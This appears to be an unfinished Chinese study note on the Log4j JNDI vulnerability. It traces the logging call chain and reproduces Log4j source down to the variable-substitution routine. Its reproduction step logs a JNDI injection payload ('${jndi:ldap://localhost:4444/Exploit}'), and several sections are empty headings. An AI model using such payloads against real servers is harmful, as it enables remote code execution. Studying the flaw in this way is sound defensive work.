# Log4j JNDI Bug

[toc]

## 复现

1. 调用 Log4j

	```
	import org.apache.logging.log4j.LogManager;
	import org.apache.logging.log4j.Logger;
	
	public class TryLog4j {
	
	    private static Logger LOG = LogManager.getLogger(TryLog4j.class);
	
	    public static void main(String[] args) {
	        LOG.error("${jndi:ldap://localhost:4444/Exploit}");
	    }
	
	}
	```

2. 启动 LDAP
	
	
	
## 问题点

### Debug

AbstractLogger#log
Logger#log
LogConfig#log
LogConfig#processLogEvent
LogConfig#callAppenders
AppenderControl#tryCallAppender
AbstractOutputStreamAppender#append
AbstractOutputStreamAppender#directEncodeEvent
PatternLayout#encode
PatternLayout#toText
PatternLayout.PatternSerializer#toSerializable
PatternFormatter#format
MessagePatternConverter#format
StrSubstitutor#substitute

### JNDI 攻击

### 为什么 Log4j 要支持 JNDI

## 修复及效果

### 修复方式



## 参考
### Log4j Codes

```
// AbstractLogger
    @PerformanceSensitive
    private void tryLogMessage(final String fqcn, final StackTraceElement location, final Level level, final Marker marker, final Message msg, final Throwable throwable) {
        try {
            this.log(level, marker, fqcn, location, msg, throwable);
        } catch (Exception var8) {
            this.handleLogMessageException(var8, fqcn, msg);
        }

// Logger
    protected void log(final Level level, final Marker marker, final String fqcn, final StackTraceElement location, final Message message, final Throwable throwable) {
        ReliabilityStrategy strategy = this.privateConfig.loggerConfig.getReliabilityStrategy();
        if (strategy instanceof LocationAwareReliabilityStrategy) {
            ((LocationAwareReliabilityStrategy)strategy).log(this, this.getName(), fqcn, location, marker, level, message, throwable);
        } else {
            strategy.log(this, this.getName(), fqcn, marker, level, message, throwable);
        }

    }

// LoggerConfig
    @PerformanceSensitive({"allocation"})
    public void log(final String loggerName, final String fqcn, final StackTraceElement location, final Marker marker, final Level level, final Message data, final Throwable t) {
        List<Property> props = null;
        if (!this.propertiesRequireLookup) {
            props = this.properties;
        } else if (this.properties != null) {
            props = new ArrayList(this.properties.size());
            LogEvent event = Log4jLogEvent.newBuilder().setMessage(data).setMarker(marker).setLevel(level).setLoggerName(loggerName).setLoggerFqcn(fqcn).setThrown(t).build();

            for(int i = 0; i < this.properties.size(); ++i) {
                Property prop = (Property)this.properties.get(i);
                String value = prop.isValueNeedsLookup() ? this.config.getStrSubstitutor().replace(event, prop.getValue()) : prop.getValue();
                ((List)props).add(Property.createProperty(prop.getName(), value));
            }
        }

        LogEvent logEvent = this.logEventFactory instanceof LocationAwareLogEventFactory ? ((LocationAwareLogEventFactory)this.logEventFactory).createEvent(loggerName, marker, fqcn, location, level, data, (List)props, t) : this.logEventFactory.createEvent(loggerName, marker, fqcn, level, data, (List)props, t);

        try {
            this.log(logEvent, LoggerConfig.LoggerConfigPredicate.ALL);
        } finally {
            ReusableLogEventFactory.release(logEvent);
        }

    private void processLogEvent(final LogEvent event, final LoggerConfig.LoggerConfigPredicate predicate) {
        event.setIncludeLocation(this.isIncludeLocation());
        if (predicate.allow(this)) {
            this.callAppenders(event);
        }

        this.logParent(event, predicate);

    @PerformanceSensitive({"allocation"})
    protected void callAppenders(final LogEvent event) {
        AppenderControl[] controls = this.appenders.get();

        for(int i = 0; i < controls.length; ++i) {
            controls[i].callAppender(event);
        }
    }

// AppenderControl
    private void tryCallAppender(final LogEvent event) {
        try {
            appender.append(event);
        } catch (final RuntimeException error) {
            handleAppenderError(event, error);
        } catch (final Throwable error) {
            handleAppenderError(event, new AppenderLoggingException(error));
        }

// AbstractOutputStreamAppender
    @Override
    public void append(final LogEvent event) {
        try {
            tryAppend(event);
        } catch (final AppenderLoggingException ex) {
            error("Unable to write to stream " + manager.getName() + " for appender " + getName(), event, ex);
            throw ex;
        }
    }
    
    protected void directEncodeEvent(final LogEvent event) {
        getLayout().encode(event, manager);
        if (this.immediateFlush || event.isEndOfBatch()) {
            manager.flush();
        }
    
// PatternLayout
    @Override
    public void encode(final LogEvent event, final ByteBufferDestination destination) {
        if (!(eventSerializer instanceof Serializer2)) {
            super.encode(event, destination);
            return;
        }
        final StringBuilder text = toText((Serializer2) eventSerializer, event, getStringBuilder());
        final Encoder<StringBuilder> encoder = getStringBuilderEncoder();
        encoder.encode(text, destination);
        trimToMaxSize(text);
    }

    private StringBuilder toText(final Serializer2 serializer, final LogEvent event,
            final StringBuilder destination) {
        return serializer.toSerializable(event, destination);
    }

// PatternLayout.PatternSerializer

        @Override
        public StringBuilder toSerializable(final LogEvent event, final StringBuilder buffer) {
            final int len = formatters.length;
            for (int i = 0; i < len; i++) {
                formatters[i].format(event, buffer);
            }
            if (replace != null) { // creates temporary objects
                String str = buffer.toString();
                str = replace.format(str);
                buffer.setLength(0);
                buffer.append(str);
            }
            return buffer;
        }

// PatternFormatter
    public void format(final LogEvent event, final StringBuilder buf) {
        if (skipFormattingInfo) {
            converter.format(event, buf);
        } else {
            formatWithInfo(event, buf);
        }
    }

// MessagePatternConverter

    @Override
    public void format(final LogEvent event, final StringBuilder toAppendTo) {
        final Message msg = event.getMessage();
        if (msg instanceof StringBuilderFormattable) {

            final boolean doRender = textRenderer != null;
            final StringBuilder workingBuilder = doRender ? new StringBuilder(80) : toAppendTo;

            final int offset = workingBuilder.length();
            if (msg instanceof MultiFormatStringBuilderFormattable) {
                ((MultiFormatStringBuilderFormattable) msg).formatTo(formats, workingBuilder);
            } else {
                ((StringBuilderFormattable) msg).formatTo(workingBuilder);
            }

            // TODO can we optimize this?
            if (config != null && !noLookups) {
                for (int i = offset; i < workingBuilder.length() - 1; i++) {
                    if (workingBuilder.charAt(i) == '$' && workingBuilder.charAt(i + 1) == '{') {
                        final String value = workingBuilder.substring(offset, workingBuilder.length());
                        workingBuilder.setLength(offset);
                        workingBuilder.append(config.getStrSubstitutor().replace(event, value));
                    }
                }
            }
            if (doRender) {
                textRenderer.render(workingBuilder, toAppendTo);
            }
            return;
        }
        if (msg != null) {
            String result;
            if (msg instanceof MultiformatMessage) {
                result = ((MultiformatMessage) msg).getFormattedMessage(formats);
            } else {
                result = msg.getFormattedMessage();
            }
            if (result != null) {
                toAppendTo.append(config != null && result.contains("${")
                        ? config.getStrSubstitutor().replace(event, result) : result);
            } else {
                toAppendTo.append("null");
            }
        }
    }

// StrSubstitutor
    private int substitute(final LogEvent event, final StringBuilder buf, final int offset, final int length,
                           List<String> priorVariables) {
        final StrMatcher prefixMatcher = getVariablePrefixMatcher();
        final StrMatcher suffixMatcher = getVariableSuffixMatcher();
        final char escape = getEscapeChar();
        final StrMatcher valueDelimiterMatcher = getValueDelimiterMatcher();
        final boolean substitutionInVariablesEnabled = isEnableSubstitutionInVariables();

        final boolean top = priorVariables == null;
        boolean altered = false;
        int lengthChange = 0;
        char[] chars = getChars(buf);
        int bufEnd = offset + length;
        int pos = offset;
        while (pos < bufEnd) {
            final int startMatchLen = prefixMatcher.isMatch(chars, pos, offset, bufEnd);
            if (startMatchLen == 0) {
                pos++;
            } else {
                // found variable start marker
                if (pos > offset && chars[pos - 1] == escape) {
                    // escaped
                    buf.deleteCharAt(pos - 1);
                    chars = getChars(buf);
                    lengthChange--;
                    altered = true;
                    bufEnd--;
                } else {
                    // find suffix
                    final int startPos = pos;
                    pos += startMatchLen;
                    int endMatchLen = 0;
                    int nestedVarCount = 0;
                    while (pos < bufEnd) {
                        if (substitutionInVariablesEnabled
                                && (endMatchLen = prefixMatcher.isMatch(chars, pos, offset, bufEnd)) != 0) {
                            // found a nested variable start
                            nestedVarCount++;
                            pos += endMatchLen;
                            continue;
                        }

                        endMatchLen = suffixMatcher.isMatch(chars, pos, offset, bufEnd);
                        if (endMatchLen == 0) {
                            pos++;
                        } else {
                            // found variable end marker
                            if (nestedVarCount == 0) {
                                String varNameExpr = new String(chars, startPos + startMatchLen, pos - startPos - startMatchLen);
                                if (substitutionInVariablesEnabled) {
                                    final StringBuilder bufName = new StringBuilder(varNameExpr);
                                    substitute(event, bufName, 0, bufName.length());
                                    varNameExpr = bufName.toString();
                                }
                                pos += endMatchLen;
                                final int endPos = pos;

                                String varName = varNameExpr;
                                String varDefaultValue = null;

                                if (valueDelimiterMatcher != null) {
                                    final char [] varNameExprChars = varNameExpr.toCharArray();
                                    int valueDelimiterMatchLen = 0;
                                    for (int i = 0; i < varNameExprChars.length; i++) {
                                        // if there's any nested variable when nested variable substitution disabled, then stop resolving name and default value.
                                        if (!substitutionInVariablesEnabled
                                                && prefixMatcher.isMatch(varNameExprChars, i, i, varNameExprChars.length) != 0) {
                                            break;
                                        }
                                        if (valueEscapeDelimiterMatcher != null) {
                                            int matchLen = valueEscapeDelimiterMatcher.isMatch(varNameExprChars, i);
                                            if (matchLen != 0) {
                                                String varNamePrefix = varNameExpr.substring(0, i) + Interpolator.PREFIX_SEPARATOR;
                                                varName = varNamePrefix + varNameExpr.substring(i + matchLen - 1);
                                                for (int j = i + matchLen; j < varNameExprChars.length; ++j){
                                                    if ((valueDelimiterMatchLen = valueDelimiterMatcher.isMatch(varNameExprChars, j)) != 0) {
                                                        varName = varNamePrefix + varNameExpr.substring(i + matchLen, j);
                                                        varDefaultValue = varNameExpr.substring(j + valueDelimiterMatchLen);
                                                        break;
                                                    }
                                                }
                                                break;
                                            } else {
                                                if ((valueDelimiterMatchLen = valueDelimiterMatcher.isMatch(varNameExprChars, i)) != 0) {
                                                    varName = varNameExpr.substring(0, i);
                                                    varDefaultValue = varNameExpr.substring(i + valueDelimiterMatchLen);
                                                    break;
                                                }
                                            }
                                        } else {
                                            if ((valueDelimiterMatchLen = valueDelimiterMatcher.isMatch(varNameExprChars, i)) != 0) {
                                                varName = varNameExpr.substring(0, i);
                                                varDefaultValue = varNameExpr.substring(i + valueDelimiterMatchLen);
                                                break;
                                            }
                                        }
                                    }
                                }

                                // on the first call initialize priorVariables
                                if (priorVariables == null) {
                                    priorVariables = new ArrayList<>();
                                    priorVariables.add(new String(chars, offset, length + lengthChange));
                                }

                                // handle cyclic substitution
                                checkCyclicSubstitution(varName, priorVariables);
                                priorVariables.add(varName);

                                // resolve the variable
                                String varValue = resolveVariable(event, varName, buf, startPos, endPos);
                                if (varValue == null) {
                                    varValue = varDefaultValue;
                                }
                                if (varValue != null) {
                                    // recursive replace
                                    final int varLen = varValue.length();
                                    buf.replace(startPos, endPos, varValue);
                                    altered = true;
                                    int change = substitute(event, buf, startPos, varLen, priorVariables);
                                    change = change + (varLen - (endPos - startPos));
                                    pos += change;
                                    bufEnd += change;
                                    lengthChange += change;
                                    chars = getChars(buf); // in case buffer was altered
                                }

                                // remove variable from the cyclic stack
                                priorVariables.remove(priorVariables.size() - 1);
                                break;
                            }
                            nestedVarCount--;
                            pos += endMatchLen;
                        }
                    }
                }
            }
        }
        if (top) {
            return altered ? 1 : 0;
        }
        return lengthChange;
    }

    protected String resolveVariable(final LogEvent event, final String variableName, final StringBuilder buf,
                                     final int startPos, final int endPos) {
        final StrLookup resolver = getVariableResolver();
        if (resolver == null) {
            return null;
        }
        return resolver.lookup(event, variableName);
    }

```

